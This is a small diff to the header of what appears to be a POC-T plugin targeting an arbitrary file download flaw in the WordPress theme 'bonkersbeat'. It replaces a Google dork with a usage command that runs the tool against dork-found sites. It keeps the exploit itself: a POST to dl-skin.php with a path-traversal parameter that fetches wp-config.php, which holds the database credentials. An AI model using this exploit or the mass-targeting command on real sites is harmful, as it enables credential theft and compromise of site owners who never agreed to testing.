@@ -6,8 +6,9 @@
 """
 WordPress theme bonkersbeat Arbitrary File Download Vulnerability
 
-Dork
-  inurl:/wp-content/themes/bonkersbeat/
+Usage
+  python POC-T.py -s wp-bonkersbeat-filedownload -aG "inurl:/wp-content/themes/bonkersbeat"
+
 EXPLOIT
   [POST] http://host/wp-content/themes/bonkersbeat/lib/scripts/dl-skin.php
   _mysite_download_skin=../../../../../wp-config.php
